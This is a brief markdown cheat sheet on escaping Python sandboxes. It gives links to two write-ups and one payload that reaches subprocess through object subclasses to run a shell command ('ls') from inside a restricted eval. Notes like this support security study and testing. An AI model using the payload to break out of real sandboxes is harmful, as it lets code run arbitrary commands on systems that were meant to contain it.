# Breaking through sandboxes

## Python

https://netsec.expert/posts/breaking-python3-eval-protections/

```shell
print(().__class__.__bases__[0].__subclasses__()[317]("ls",shell=True,stdout=-1).communicate())
```
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html